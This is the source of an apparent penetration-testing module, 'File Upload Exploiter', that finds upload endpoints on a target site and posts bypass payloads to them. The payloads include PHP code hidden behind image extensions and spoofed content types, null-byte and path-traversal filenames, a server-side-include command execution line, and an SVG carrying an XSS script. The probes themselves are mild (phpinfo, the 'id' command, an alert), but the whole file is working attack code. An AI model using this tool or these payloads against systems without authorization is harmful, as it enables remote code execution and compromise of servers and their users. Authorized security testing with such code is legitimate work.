# -*- coding: utf-8 -*-
"""
Aura v31.0 - File Upload Exploiter (Phase 26)
==============================================
Detects insecure file upload implementations.

Attacks:
- Extension bypass (.php.jpg, .phtml, .php5, .shtml)
- Content-Type spoofing (upload PHP as image/jpeg)
- Path traversal in filename
- Polyglot files (valid image + embedded code)
- SVG XSS / XXE
- Null byte injection (.php%00.jpg)
"""
import asyncio
import httpx
import re
from rich.console import Console

from aura.ui.formatter import console

UPLOAD_PATHS = [
    "/upload", "/api/upload", "/file/upload", "/files/upload",
    "/upload/file", "/api/files", "/media/upload", "/image/upload",
    "/avatar/upload", "/profile/photo", "/api/avatar", "/documents/upload",
    "/attach", "/api/attach", "/import",
]

# Web shell content (non-destructive - just reads phpinfo)
PHP_PROBE = b"<?php echo 'AURA_UPLOAD_CONFIRMED_31'; phpinfo(); ?>"
PHP_PROBE_MARKER = "AURA_UPLOAD_CONFIRMED_31"

# Malicious extension list
BYPASS_EXTENSIONS = [
    ("shell.php.jpg", "image/jpeg", PHP_PROBE),
    ("shell.phtml", "application/octet-stream", PHP_PROBE),
    ("shell.php5", "image/png", PHP_PROBE),
    ("shell.shtml", "text/html", b"<!--#exec cmd='id' -->"),
    ("shell.php%00.jpg", "image/jpeg", PHP_PROBE),
    ("../../../shell.php", "image/jpeg", PHP_PROBE),
    ("shell.svg", "image/svg+xml",
     b'<svg xmlns="http://www.w3.org/2000/svg"><script>alert("AURA_XSS_31")</script></svg>'),
]

# Minimal valid JPEG header (for polyglot)
JPEG_MAGIC = b"\xff\xd8\xff\xe0\x00\x10JFIF\x00"


class FileUploadEngine:
    """v31.0: File Upload Exploiter."""

    def __init__(self, session=None):
        self.session = session

    async def _probe_upload(self, client, url: str,
                             filename: str, content_type: str,
                             content: bytes) -> dict | None:
        """Attempts to upload a file and checks if it was accepted."""
        try:
            files = {"file": (filename, content, content_type)}
            # Also try common field names
            for field in ["file", "upload", "image", "avatar", "attachment", "doc"]:
                files = {field: (filename, content, content_type)}
                r = await client.post(url, files=files, timeout=12)
                if r.status_code in (200, 201):
                    body = r.text
                    # Check for upload success indicators
                    if any(k in body.lower() for k in ["success", "uploaded", "url", "path", "file"]):
                        # Try to find the uploaded file URL
                        urls_found = re.findall(r'https?://[^\s"\'<>]+' + re.escape(filename.split('.')[0]), body)
                        file_url = urls_found[0] if urls_found else "Check server response"
                        return {
                            "type": f"Insecure File Upload ({filename})",
                            "finding_type": "Unrestricted File Upload",
                            "severity": "CRITICAL" if filename.endswith((".php", ".phtml", ".php5")) else "HIGH",
                            "owasp": "A01:2021 - Broken Access Control",
                            "mitre": "T1190 - Exploit Public-Facing Application",
                            "content": (
                                f"Malicious file accepted on {url}\n"
                                f"Filename: {filename}\n"
                                f"Content-Type: {content_type}\n"
                                f"Field: {field}\n"
                                f"Uploaded to: {file_url}\n"
                                f"Impact: Server-side code execution may be possible."
                            ),
                            "url": url,
                            "confirmed": True,
                            "poc_evidence": f"POST {url} with {field}={filename}"
                        }
            return None
        except Exception:
            return None

    async def scan_target(self, target_url: str) -> list:
        from urllib.parse import urlparse
        base = f"{urlparse(target_url).scheme}://{urlparse(target_url).netloc}"
        findings = []
        console.print(f"[bold cyan][FileUpload] Scanning {base} for upload endpoints...[/bold cyan]")

        async with httpx.AsyncClient(verify=False, follow_redirects=True) as client:
            # Discover upload endpoints
            upload_endpoints = []
            for path in UPLOAD_PATHS:
                url = f"{base}{path}"
                try:
                    r = await client.get(url, timeout=6)
                    if r.status_code not in (404, 502, 503):
                        upload_endpoints.append(url)
                except Exception:
                    pass

            if not upload_endpoints:
                console.print(f"[dim][FileUpload] No upload endpoints found on {base}[/dim]")
                return []

            console.print(f"[cyan][FileUpload] Found {len(upload_endpoints)} endpoint(s). Testing {len(BYPASS_EXTENSIONS)} payloads...[/cyan]")

            sem = asyncio.Semaphore(5)
            seen = set()

            async def _test(endpoint, filename, ct, content):
                async with sem:
                    return await self._probe_upload(client, endpoint, filename, ct, content)

            tasks = [
                _test(ep, fn, ct, content)
                for ep in upload_endpoints[:3]
                for fn, ct, content in BYPASS_EXTENSIONS
            ]
            results = await asyncio.gather(*tasks)

            for r in results:
                if r and r["url"] not in seen:
                    seen.add(r["url"])
                    console.print(f"[bold red][FileUpload CONFIRMED] {r['type']}! {r['url']}[/bold red]")
                    findings.append(r)

        if not findings:
            console.print(f"[dim][FileUpload] No upload vulnerabilities detected.[/dim]")
        return findings

    async def scan_urls(self, urls: list) -> list:
        all_findings = []
        seen = set()
        for url in urls:
            from urllib.parse import urlparse
            base = f"{urlparse(url).scheme}://{urlparse(url).netloc}"
            if base in seen:
                continue
            seen.add(base)
            try:
                results = await self.scan_target(url)
                all_findings.extend(results)
            except Exception as e:
                console.print(f"[dim red][FileUpload] Skipped {url}: {e}[/dim red]")
        return all_findings
